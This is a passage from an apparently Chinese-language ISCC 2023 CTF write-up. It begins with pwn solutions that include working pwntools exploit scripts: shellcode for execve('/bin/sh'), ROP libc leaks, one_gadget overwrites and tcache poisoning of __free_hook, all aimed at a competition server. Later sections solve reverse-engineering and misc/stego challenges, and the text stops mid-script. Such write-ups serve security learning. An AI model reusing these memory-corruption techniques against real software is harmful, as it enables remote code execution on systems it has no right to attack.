p,elf,libc=load(&quot;last&quot;,&quot;59.110.164.72:10025&quot;)
p.sendafter(&quot;Start injecting\n&quot;,b&quot;\x00&quot;+b&quot;y&quot;*23)
p.recvline()
heap_addr=int(p.recv(9)[:-1])
log_addr(&quot;heap_addr&quot;)
pause()      
p.send(str(-1)) 
pause()
request_size=0x6012a0-0x20-(heap_addr-8)
p.send(str(request_size))
payload=b&quot;a&quot;*0x10
p.sendafter(b&quot;Answer time is close to over\n&quot;,payload)
leave_ret=0x0000000000400944
rbp=0x00000601328
shellcode=0x601338
payload=b&quot;a&quot;*0x80
payload+=p64(rbp)+p64(leave_ret)+p64(shellcode)
payload+=b&quot;\x48\xC7\xC0\x3B\x00\x00\x00\x49\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x41\x50\x48\x31\xF6\x48\x31\xD2\x54\x5F\x0F\x05&quot;
p.sendafter(&quot;Direct to destination\n&quot;,payload)
p.interactive()
</code></pre><h3 id="第一用笔"><a class="anchor" href="#第一用笔">#</a> 第一用笔</h3><p>存在溢出，控制 rbp 第二次调用 read 任意写，打 one_gadget 拿 shell</p><pre><code class="language-py">from tools import *
context.log_level=&quot;debug&quot;
p=remote(&quot;59.110.164.72&quot;,10002)
pop_rdi=0x0000000000400c53
puts_plt=0x4006F0
puts_got=0x602020
payload=b'dunbi000'
payload+=b'cuobi000'
payload+=b'yufeng00'
payload+=b'dunfeng0'
payload+=b'cunfeng0'
payload+=b'nvfeng00'
payload+=b'yuefeng0'
payload+=b'anfeng00'
payload+=b'jiebi000'
p.sendlineafter(&quot;and 40 to 47 is 'nvfeng00'!\n&quot;,payload)
debug(p)
payload=b'a'*0x28+p64(0x400B0F)
p.sendafter(&quot;or you can look for other space\n&quot;,payload)
payload=b'a'*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x400B0F)
pause()
p.send(payload)
libc_base=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-0x6f6a0
log_addr(&quot;libc_base&quot;)
og=[0x45226,0x4527a,0xf03a4,0xf1247]
payload=b'a'*0x28+p64(og[1]+libc_base)
pause()
p.send(payload)
p.interactive()
</code></pre><h3 id="sims"><a class="anchor" href="#sims">#</a> SIMS</h3><p>2.27 因为有 uaf 和 edit 功能，直接打 tcache poisoning</p><pre><code class="language-py">from tools import *
context.log_level='debug'

def add(size):
    p.sendlineafter(&quot;please choose one!\n&quot;,str(1))
    p.sendlineafter(&quot;Age of Stu:\n&quot;,str(size))
    
def show(index):
    p.sendlineafter(&quot;please choose one!\n&quot;,str(4))
    p.sendlineafter(&quot;Index:\n&quot;,str(index))

def edit(index,content):
    p.sendlineafter(&quot;please choose one!\n&quot;,str(3))
    p.sendlineafter(&quot;Index:\n&quot;,str(index))
    p.sendafter(&quot;Content of Stu:\n&quot;,content)

def delete(index):
    p.sendlineafter(&quot;please choose one!\n&quot;,str(2))
    p.sendlineafter(&quot;Index:\n&quot;,str(index))
p,e,libc=load(&quot;SIMS&quot;,&quot;59.110.164.72:10085&quot;)
key=1804289383^365696460
p.sendlineafter(&quot;welcome~ please input the password:\n&quot;,str(key))
add(0x500)
add(0x40)
add(0x40)
delete(0)
delete(1)
delete(2)
show(0)
libc_base=recv_libc()-0x3ebca0
sys_addr=libc_base+libc.symbols['system']
free_hook=libc_base+libc.symbols['__free_hook']
edit(2,p64(free_hook))
add(0x40)
add(0x40)
edit(2,'/bin/sh\x00')
edit(1,p64(sys_addr))
delete(2)
p.interactive()
</code></pre><h3 id="your_character"><a class="anchor" href="#your_character">#</a> Your_character</h3><p>2.23 的 libc，发现是个菜单堆，漏洞是 off by one，释放堆块进入 unsorted bin，执行 show 函数可以得到 unsorted bin 的 fd 指针，也就是 main_arena+88，也就是 libc 地址。然后再改 size 中的 prev inuse 位，触发堆块合并，造成堆块重叠，然后把 free_hook 申请出来写入 one_gadget</p><pre><code class="language-py">from tools import*
p,e,libc=load('4','59.110.164.72:10003')
p.sendlineafter('Your choice :',str(1))
def add(size,content='/bin/sh\x00'):
    p.sendlineafter('Your choice :',str(1))
    p.sendlineafter('Damage of skill :',str(size))
    p.sendafter('introduction of skill:',content)
def edit(index,size):
    p.sendlineafter('Your choice :',str(2))
    p.sendlineafter( 'Index :',str(index))
    p.sendafter('Damage of skill :',str(size))
def edit2(index,content='/bin/sh\x00'):
    p.sendlineafter('Your choice :',str(3))
    p.sendlineafter( 'Index :',str(index))
    p.sendafter('introduction of skill :',content)
def show(index):
    p.sendlineafter('Your choice :',str(4))
    p.sendlineafter( 'Index :',str(index))
def delete(index):
    p.sendlineafter('Your choice :',str(5))
    p.sendlineafter( 'Index :',str(index))

add(0x478,b'1'*0x28)
add(0x28,b'2'*0x28)
edit(0,0x488)
add(0x28,b'aaaaaaaa')
show(2)
p.recvuntil('aaaaaaaa')
libc_base=u64(p.recv(6).ljust(8,b'\x00'))-0x3c4b78
log_addr('libc_base')
malloc_hook=libc_base+0x3c4b10
free=libc_base+0x3c67a8
og=[0x45226,0x4527a,0xf03a4,0xf1247]
edit2(0,b'a'*0x430+p64(0x440))
delete(1)
delete(0)
delete(2)
add(0x38)
edit(0,0x38)
add(0x38)
edit(1,0x38)
add(0x38)
edit(2,0x38)
add(0x38,'cccccccc')
edit(3,0x48)
edit2(0,b'b'*0x38+b'\x61')
delete(1)
add(0x58,b'dddddddd'*7+p64(0x50)*2+p64(free))
edit(1,0x58)
edit2(2,p64(og[1]+libc_base))
delete(0)
p.interactive()
</code></pre><h2 id="reverse"><a class="anchor" href="#reverse">#</a> Reverse</h2><h3 id="justdoit"><a class="anchor" href="#justdoit">#</a> JustDoIt</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242208224.gif" alt="img"></p><p>只有一个加密函数，在第 36 行的 sub_487C91</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242208223.gif" alt="img"></p><p>简单的加密函数，是一些常规的字符串变换，有四个 for 循环加密</p><p>只有最后一个 for 循环需要注意，使用了 “ISCC” 来加密</p><p>脚本</p><pre><code class="language-c">#include &lt;stdio.h&gt;
int main() &#123;
    char a1[15]=&#123;23,68,68,15,94,10,8,10,6,95,8,24,87,3,26&#125;;
  	char a2[5]=&quot;ISCC&quot;;
    int a3 = 15;

    for (int m = 1; m &lt; a3; ++m) &#123;
        a1[m] ^= a2[0];
        a1[m] -= a2[m % 4] % 5;
        a1[m] += a2[2] % 6 + a2[3] / 6;
        a1[m] -= a2[1] / 7 + a2[0] % 7;
    &#125;
    for (int k = 1; k &lt; a3; ++k) &#123;
        a1[k] -= k;
    &#125;
    int v4 = a1[a3 - 1];
    for (int j = a3 - 1; j &gt; 0; --j) &#123;
        a1[j] = a1[j - 1];
    &#125;
    for (int i = 0; i &lt; a3; ++i) &#123;
        a1[i] += 60;
    &#125;
    for (int i = 1; i &lt;15; ++i) &#123;
		if(i==15)
		&#123;
			printf(&quot;%c&quot;,a1[0]);
		return 0;
		&#125;
		printf(&quot;%c&quot;, a1[i]); 
    &#125;
&#125;
</code></pre><p>得到 flag：ISCC {Just<sub>Do</sub>It}</p><h3 id="奇门遁甲"><a class="anchor" href="#奇门遁甲">#</a> 奇门遁甲</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242220688.gif" alt="img"></p><p>逻辑是需要按照 v3 自增的顺序选择输入，v3 是从 1 加到 8，我们需要让 case 选择 v3 自增的顺序，也就是 3 1 2 8 4 5 6 7</p><p>每次输入都会有 flag 碎片，拼起来就能得到 flag</p><p xx9ngk&amp;2tqrdv6wcoxsgrgax="">Flag：ISCC</p><h3 id="congratulations"><a class="anchor" href="#congratulations">#</a> Congratulations</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210828.gif" alt="img"></p><p>第 41 行一眼顶针，鉴定为假 flag，所以不管</p><p>真正的输入在 44 行，接着经过了两个加密函数</p><p>第一个加密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210829.gif" alt="img"></p><p>凯撒加密，传入的 - 1 是移动的位数，所以字符串在字母表中的位置整体向左移一位</p><p>第二个加密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242210836.gif" alt="img"></p><p>是自定义加密，有三段 for 循环，代表三段加密</p><p>第一段所有字符串减 30,</p><p>第二段将字符串的前一位减去后一位</p><p>第三段将所有字符串异或 “S”</p><p>逻辑清晰，接下来写脚本</p><pre><code class="language-c">#include&lt;stdio.h&gt;
void re(char *a1, char *a2, int a3) &#123;
	int k,j,i,p;
    for (k = a3 - 2; k &gt;= 0; --k) &#123;
        a1[k] ^= *(a2 + 1);
    &#125;
    for (j = a3 - 2; j &gt;= 0; --j) &#123;
        a1[j] += a1[j+1];
    &#125;
    for (p = a3 - 1; p &gt;= 0; --p) &#123;
        a1[p] += 30;
    &#125;
    
  char v4[36]=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
  char v5[32]=&quot;abcdefghijklmnopqrstuvwxyz&quot;;

  for ( i = 0; ; ++i )
  &#123;
    if ( !*(i + a1) )
      break;
    if ( *(i + a1) &lt; 97 || *(i + a1) &gt; 122 )
    &#123;
      if ( *(i + a1) &gt;= 65 &amp;&amp; *(i + a1) &lt;= 90 )
        *(i + a1) = v4[(*(i + a1) - 65 + 1) % 26];
    &#125;
    else
    &#123;
      *(i + a1) = v5[(*(i + a1) - 97 + 1) % 26];
    &#125;
  &#125;
&#125;


int main()
&#123;
	char v9[26];
 v9[0] = -91;
  v9[1] = 67;
  v9[2] = 83;
  v9[3] = -108;
  v9[4] = 126;
  v9[5] = 89;
  v9[6] = -76;
  v9[7] = 107;
  v9[8] = -92;
  v9[9] = -26;
  v9[10] = 101;
  v9[11] = 80;
  v9[12] = -113;
  v9[13] = 116;
  v9[14] = -70;
  v9[15] = -65;
  v9[16] = -67;
  v9[17] = 17;
  v9[18] = -90;
  v9[19] = -100;
  v9[20] = 28;
  v9[21] = -79;
  v9[22] = -79;
  v9[23] = 19;
  v9[24] = -9;
  v9[25] = 95;
  	char v6[]=&quot;ISCC&quot;;
  	int v8=26;
	re(v9,v6,v8);
	int i;
	 for (i = 0; i &lt; 26; i++) &#123;

        printf(&quot;%c&quot;, v9[i]);
    &#125;
	return 0;
 &#125; 
</code></pre><p oe]%.zd@e="Uia8Du%Db!">输出为：ISCC</p><h3 id="变形记"><a class="anchor" href="#变形记">#</a> 变形记</h3><p>说实话这道题代码分析还挺困难的，无用代码很多，最后还是沉下心慢慢分析才有了头绪。因为代码很长，就只分析关键代码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213833.gif" alt="img"></p><p>图示代码实现了遍历输入寻找相邻的相同字符，如果相同，则记录，最后将相同字符转换为相同字符的个数，替换原来的字符串</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213833.gif" alt="img"></p><p>这里有个 base 码，本来以为对 base 码也有加密，但是看到字符串开头有两个等号，就先猜是不是把编码倒过来解密就可以了，结果正确</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242213839.gif" alt="img"></p><p>所以脚本如下</p><pre><code class="language-python">import base64

def reverse_string(string):
    return string[::-1]
def base64_decode(string):
    return base64.b64decode(string).decode('utf-8')

user_input = input(&quot;输入：&quot;)

reversed_string = reverse_string(user_input)
print(&quot;逆序：&quot;, reversed_string)

decoded_string = base64_decode(reversed_string)
print(decoded_string)

</code></pre><pre><code>得到y3QvyUyQsVszsyv2ays，对其进行变换
得到flag：ISCC&#123;yyyQvyUyQsVszsyvvays&#125;
</code></pre><h3 id="convert"><a class="anchor" href="#convert">#</a> Convert</h3><p>这道题只需要理清字符串变换的逻辑就行了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242219547.gif" alt="img"></p><p>可以看到这道题只有一个加密函数 sub_488B0A</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242219550.gif" alt="img"></p><p>这里的加密逻辑也很简单，首先让字符串遍历减去 32 在加上遍历值</p><p>接着是一个自定义加密，将 “ISCC” 作为密钥传入，这里写脚本需要倒着写，因为第 21 行的加密使用的是第 19 行加密的数据，所以解密需要加密的数据</p><p>脚本如下</p><pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void re(char *a1, char *a2, int a3) &#123;
    int i, j;
    for (j = 3; j &gt;=0 ; j--) &#123;
        *(a1 + j + 16) -= (*(a2 + j))/ 5;
        *(a1 + j + 12) -= *(a1 + j + 4);
        *(a1 + j + 8) -= 2 * j;
        *(a1 + j + 4) -= *(a2 + j) % 5;
        *(a1 + j) -= j ^ -(*(a2 + j) % 4);
    &#125;
        for (i = 0; i &lt;=a3-1; i++) &#123;
        *(a1 + i) -= i;
        *(a1 + i) += 32;
    &#125;
&#125;

int main() &#123;
 Char	a1[]= &#123;0x28,0x30,0x24,0x24,0x62,0x2E,0x1A,0x0A,0x1C,0x48,0x2E,0x3A,0x93,0x5B,0x48,0x50,0x3E,0x42,0x2A,0x36,0x3B,0x28,0x73&#125;;
    char a2[] = &quot;ISCC&quot;;
    int a3 = 23;
    int i;
    re(a1, a2, a3);
    for (i = 0; i &lt; 23; i++) &#123;

        printf(&quot;%c&quot;, a1[i]);
    &#125;
    return 0;
&#125;
</code></pre><h3 id="pull-the-wool-over-peoples-eyes"><a class="anchor" href="#pull-the-wool-over-peoples-eyes">#</a> Pull the Wool Over People's Eyes</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242221641.gif" alt="img"></p><p>程序使用 Src 当密钥与输入进行异或，Src 的获取与 44 行函数有关，进入函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242221643.gif" alt="img"></p><p>可以发现密钥，但是注意 v18 经过了一次冒泡排序变换，所以我们需要先获取冒泡排序后的输出</p><pre><code class="language-python">def bubble_sort(string):
    n = len(string)
    # 将字符串转换为字符数组
    arr = list(string)

    # 冒泡排序
    for i in range(n - 1):
        for j in range(n - i - 1):
            if ord(arr[j]) &gt; ord(arr[j + 1]):
                arr[j], arr[j + 1] = arr[j + 1], arr[j]

    # 将排序后的字符数组转换回字符串
    sorted_string = ''.join(arr)
    return sorted_string


input_string = &quot;YouAresoClever&quot;
sorted_string = bubble_sort(input_string)
print(sorted_string)
</code></pre><p acyeeeloorrsuv="">此脚本会输出：ACYeeeloorrsuv，所以密钥为 ISCC</p><p>这里的 01 是密文转换为 2 进制的形式，按照 8bit 一个字节转换，最后异或密钥得到 flag<br>脚本如下</p><pre><code class="language-python">binary_string = &quot;0000000000000000000000000000000000000000001010010000000100110000010101010011011000011100001101000010100100110101010000000010011000110111010010100010011000000000&quot;
byte_list = [int(binary_string[i : i + 8], 2) for i in range(0, len(binary_string), 8)]
secret_key = &quot;ISCC&#123;ACYeeeloorrsuv&#125;&quot;
flag = &quot;&quot;
for i in range(len(byte_list)):
    flag += chr(ord(secret_key[i]) ^ byte_list[i])
print(flag)
</code></pre><p hbi0syxfz2td?p="">得到 flag：ISCC</p><h3 id="狂彪-1"><a class="anchor" href="#狂彪-1">#</a> 《狂彪》-1</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222653.gif" alt="img"></p><p>Get_flag 需要三个参数，</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222653.gif" alt="img"></p><p>之后输出按照这种标准输出就可以</p><p>脚本</p><pre><code class="language-python">mod = 46
m = 0x50d7c32f4a659
n = &quot;4-chloroisatin&quot;
p = &quot;Ammosamide B&quot;
mod_out = (int((m % 100000) % mod)) ^ (mod * (int)(m % 100000))
flag = &quot;ISCC&#123;&quot; + str(mod_out) + &quot;_&quot; + n + &quot;_&quot; + str(m) + &quot;_&quot; + p + &quot;&#125;&quot;
print(flag)
</code></pre><p 2449069_4-chloroisatin_1422201965553241_ammosamide="" b="">得到 flag：ISCC</p><h3 id="crackmeplease"><a class="anchor" href="#crackmeplease">#</a> CrackMePlease</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222639.gif" alt="img"></p><p>程序实现了一个自解密结构，所以我们需要将程序运行到第 64 行，就可以得到 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242222645.jpg" alt="IMG_256"></p><p>这里 flag 多了 “{EASY” 是因为在第 60 行调用了 sub_48784B 函数，将传入的 “EASY” 赋给了输入，所以去掉。</p><p p-*butn="">得到 flag:ISCC</p><h2 id="misc"><a class="anchor" href="#misc">#</a> Misc</h2><h3 id="好看的维吾尔族小姐姐"><a class="anchor" href="#好看的维吾尔族小姐姐">#</a> 好看的维吾尔族小姐姐</h3><p>16 进制编辑器修改图片高度</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251118115.png" alt="image-20230525111822991"></p><p>发现是 DM 码，水平翻转后识别信息</p><pre><code>;521#&amp;;33#&amp;;101#&amp;;011#&amp;;111#&amp;;001#&amp;;801#&amp;;801#&amp;;101#&amp;;911#&amp;;59#&amp;;611#&amp;;501#&amp;;59#&amp;;611#&amp;;111#&amp;;301#&amp;;59#&amp;;711#&amp;;111#&amp;;121#&amp;;321#&amp;;76#&amp;;76#&amp;;38#&amp;;37#&amp;
</code></pre><p>得到的是翻转后的 Unicode 的编码，这里翻转后解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251129578.png" alt="image-20230525112957478"></p><h3 id="人生之路"><a class="anchor" href="#人生之路">#</a> 人生之路</h3><p>压缩包的密码：人生之路.jpeg</p><p>打开 flag.txt</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251133105.png" alt="image-20230525113336977"></p><pre><code>jFgOyFgOjF gFyOjFyOgF gFyFjF gFyFjF gOyOgOjOyOjO gFyFjFcOgO yFcOjOjcOygOyjO gFcFjFyFyjO gFyFjFcOgO yOyjOjcOcO yOyjOjcOcO yFcOjFcOyF gFcFjFyFyjO yFjFcFgF cFyjOcjOyF yOyjOjcOcO yFjFcFgF yFcFjFyOgFjFyO yjFcgOcjOygF jFgFyFgOjF jOyOjOgOyOgO 
</code></pre><pre><code class="language-python">import string
c=&quot;&quot;.strip()
a=c.split(&quot; &quot;)
a=list(a[0])
p=0
for i in a:
    if i in string.ascii_lowercase:
        i=chr((ord(i)-97+p)%26+97)
        while i not in &quot;wasd&quot;:
            i=chr((ord(i)-97+1)%26+97)
            p+=1
    elif i in string.ascii_uppercase:
        i=chr((ord(i)-65+p)%26+65)
        while i not in &quot;ZI&quot;:
            i=chr((ord(i)-65+1)%26+65)
            p+=1
a=list(c)
for i in range(len(a)):
    if a[i]==&quot; &quot;:
        pass
    else:
        if a[i] in string.ascii_lowercase:
            a[i]=chr((ord(a[i])-97+p)%26+97)
        elif a[i] in string.ascii_uppercase:
            a[i]=chr((ord(a[i])-65+p)%26+65)
a=&quot;&quot;.join(a)
a=a.split(&quot; &quot;)
map=&#123;
    &quot;saIsIwIdIwaIsdIsI&quot;: &quot;A&quot;,
    &quot;sZwZdZsZaZdZsZaZ&quot;: &quot;B&quot;,
    &quot;aZsZdZ&quot;: &quot;C&quot;,
    &quot;sZwZdZsZaZ&quot;: &quot;D&quot;,
    &quot;dZaZsIdZaZsIdZ&quot;: &quot;E&quot;,
    &quot;dZaZsZaIdZ&quot;: &quot;F&quot;,
    &quot;aZsZdZwIaI&quot;: &quot;G&quot;,
    &quot;sZwIdZwIsZ&quot;: &quot;H&quot;,
    &quot;dZaIsZaIdZ&quot;: &quot;I&quot;,
    &quot;dZaIsZaI&quot;: &quot;J&quot;,
    &quot;sZwIdIdwIsaIsdI&quot;: &quot;K&quot;,
    &quot;sZdZ&quot;: &quot;L&quot;,
    &quot;wZsdIwdIsZ&quot;: &quot;M&quot;,
    &quot;wZsdZwZ&quot;: &quot;N&quot;,
    &quot;sZdZwZaZ&quot;: &quot;O&quot;,
    &quot;sZwZdZsIaZ&quot;: &quot;P&quot;,
    &quot;aZwZdZsZsdI&quot;: &quot;Q&quot;,
    &quot;sZwZdZsIaZdZsI&quot;: &quot;R&quot;,
    &quot;aZsIdZsIaZ&quot;: &quot;S&quot;,
    &quot;dZaIsZ&quot;: &quot;T&quot;,
    &quot;sZdZwZ&quot;: &quot;U&quot;,
    &quot;sIsdIdwIwI&quot;: &quot;V&quot;,
    &quot;sdZwdZsdZwdZ&quot;: &quot;W&quot;,
    &quot;sdZwaIwdIsaZ&quot;: &quot;X&quot;,
    &quot;sdIwdIsaIsI&quot;: &quot;Y&quot;,
    &quot;dZsaZdZ&quot;: &quot;Z&quot;,
    &quot;aIsIaIdIsIdI&quot;: &quot;&#123;&quot;,
    &quot;dIsIdIaIsIaI&quot;: &quot;&#125;&quot;
&#125;
for i in a:
    print(map[i],end='')
print()
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251134034.png" alt="image-20230525113443935"></p><h3 id="汤姆历险记"><a class="anchor" href="#汤姆历险记">#</a> 汤姆历险记</h3><p>解压文件后用 foremost 分离图片得到一个压缩包</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251138690.png" alt="image-20230525113805591"></p><p>解压发现有密码，去图片中寻找密码，在文件最后发现一串字符串</p><pre><code class="language-python">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;
strings = open('./flag.txt').read()

result = &#123;&#125;
for i in alphabet:
	counts = strings.count(i)
	i = '&#123;0&#125;'.format(i)
	result[i] = counts

res = sorted(result.items(),key=lambda item:item[1],reverse=True)
for data in res:
	print(data)

for i in res:
	flag = str(i[0])
	print(flag[0],end=&quot;&quot;)
    #&#123;yasuobpwrd91702!@$%^&amp;*&#125;
</code></pre><p>字频统计后得到密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251150808.png" alt="image-20230525115028689"></p><p>解压后得到一段文本</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251153349.png" alt="image-20230525115302186"></p><p>根据行距解摩斯</p><pre><code>..-.-..-..-.-..--.-
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251208633.png" alt="image-20230525120850474"></p><p>然后用 dictionary 中对应的字符串替换</p><h3 id="菜鸟黑客1"><a class="anchor" href="#菜鸟黑客1">#</a> 菜鸟黑客 1</h3><p>这里发现其是一个镜像文件，这里通过 R-studio 加载后再桌面找到了 flag.txt</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251302394.png" alt="image-20230525130216242"></p><p>是一个 des，用题目给到的 key 解密</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251303783.png" alt="image-20230525130351623"></p><h3 id="mystery-of-bits"><a class="anchor" href="#mystery-of-bits">#</a> mystery of bits</h3><p>更改图片高度</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251800360.png" alt="image-20230525180010008"></p><p>用 stegSolve 打开</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251906656.png" alt="image-20230525190612575"></p><p>翻转一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251916588.png" alt="image-20230525191645533"></p><p>ysafao245hfdisi，解压后得到一个 wav 文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251934620.png" alt="image-20230525193428558"></p><p>这里分解得到一串 01，很明显是像素位</p><pre><code class="language-perl">0000000000000000000000000000000011111110101010111111101111111001000001011101011100000100000100101110101111000111110010111010010111010101000000101001011101001011101010110100101000101110100100000100010110000001010000010011111110101010101010101111111000000000010011001101000000000000010101101010101010111110111110011110000111111100010100101110000010111010010110110101101111000011100000011100000111000001110001001011101001011010010110100000000110100000111000001110000000001011101001011010010110100100010001101001100111011101010100001010011111010110011101001111100000011001100100001101100101000010100010011000010000011000100001011100001011001110110110100100101011100111110101111111101100000000000100001010110100010001001111111001000110010010101010000100000101101111001001000111110010111010011101110101111110101001011101010111011001101110101000101110100010111010101110111010010000010110011001000110011110001111111000010001000010010100000000000000000000000000000000000
</code></pre><p>转二维码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251946238.png" alt="image-20230525194647169"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251947377.png" alt="image-20230525194716316"></p><h3 id="通信方式"><a class="anchor" href="#通信方式">#</a> 通信方式</h3><p>用 au 打开发现有两个声道，这里计算一下左右声道的差值</p><pre><code class="language-python">import wave

# 打开wav文件
wav_file = wave.open('telegram2wechat.wav', 'r')

# 获取声道数和采样率
num_channels = wav_file.getnchannels()
sample_rate = wav_file.getframerate()

# 读取所有采样点
frames = wav_file.readframes(-1)

# 关闭文件
wav_file.close()

# 将所有数据转换为整数
samples = list(map(
    lambda x: int.from_bytes(x, byteorder='little', signed=True),
    zip(frames[0::2], frames[1::2])
))

# 分离左右声道
left_channel = samples[::num_channels]
right_channel = samples[1::num_channels]

# 计算左右声道的差值
diff = [left - right for left, right in zip(left_channel, right_channel)]

# 输出差值
print(diff)
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251238553.png" alt="image-20230525123810382"></p><p>中间有段不一样的，这里提取出来，1 转成 0，2 替换成 1，把逗号和空格都去了</p><pre><code class="language-python">import wave

# 打开wav文件
wav_file = wave.open('telegram2wechat.wav', 'r')

# 获取声道数和采样率
num_channels = wav_file.getnchannels()
sample_rate = wav_file.getframerate()

# 读取所有采样点
frames = wav_file.readframes(-1)

# 关闭文件
wav_file.close()

# 将所有数据转换为整数
samples = list(map(
    lambda x: int.from_bytes(x, byteorder='little', signed=True),
    zip(frames[0::2], frames[1::2])
))

# 分离左右声道
left_channel = samples[::num_channels]
right_channel = samples[1::num_channels]

# 计算左右声道的差值
diff = [left - right for left, right in zip(left_channel, right_channel)]

p = [d for d in diff if d in [1, 2]]

with open('output.txt', 'w') as f:
    f.write(str(p))

with open('output.txt', 'r') as f:
    content = f.read().replace(',', '').replace(' ', '')
    content = content.replace('1', '0').replace('2', '1')
    # print(content)
    binary_str=str(content)

print(binary_str)
</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251241865.png" alt="image-20230525124129737"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251244726.png" alt="image-20230525124427569"></p><p>中文电码在线转一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251252689.png" alt="image-20230525125205545"></p><p>这里写脚本对照一下</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251254355.png" alt="image-20230525125425194"></p><h3 id="菜鸟黑客-2"><a class="anchor" href="#菜鸟黑客-2">#</a> 菜鸟黑客 - 2</h3><p>使用 volatility 工具将 jpg 文件分离</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251333307.png" alt="image-20230525133308061"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251337799.png" alt="image-20230525133710670"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251336235.png" alt="image-20230525133654160"></p><p>foremost 分离后得到一个压缩包，密码还是 ISCC2023</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251338338.png" alt="image-20230525133846257"></p><p>加下来寻找这个密钥，在 mspaint 程序中</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251340315.png" alt="image-20230525134019241"></p><p>使用 gimp 分离得到</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251342931.png" alt="image-20230525134225826"></p><p>这里提示表情是摩斯，这里解码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251343712.png" alt="image-20230525134346613"></p><p>解维吉尼亚</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251345280.png" alt="image-20230525134554203"></p><h3 id="消息传递"><a class="anchor" href="#消息传递">#</a> 消息传递</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251624725.png" alt="image-20230525162418604"></p><p>这里发现一个压缩包文件</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251621323.png" alt="image-20230525162140152"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251622028.png" alt="image-20230525162218914"></p><p>拼接后 pass：WRWAALIUWOHZAPQWFTQIPMVJFOKHHZUZ</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305251626707.png" alt="image-20230525162658563"></p><p>百块是 1，黑块是 0，解码即可</p><h3 id="你相信ai吗"><a class="anchor" href="#你相信ai吗">#</a> 你相信 AI 吗？</h3><p>这里在 dataset 文件下面有 79 个存放像素信息的文本这里先将其转换为图片</p><pre><code class="language-python">import cv2
import numpy as np

for i in range(32):
    with open(f&quot;&#123;i&#125;.txt&quot;, &quot;r&quot;) as f:
        data = f.read().splitlines()
    image_data = np.array([float(line) for line in data])
    if image_data.shape[0] == 2352:
        cv2.imwrite(f&quot;./out/&#123;i&#125;.png&quot;, image_data.reshape(84, 28))
        print(1)
    elif image_data.shape[0] == 1568:
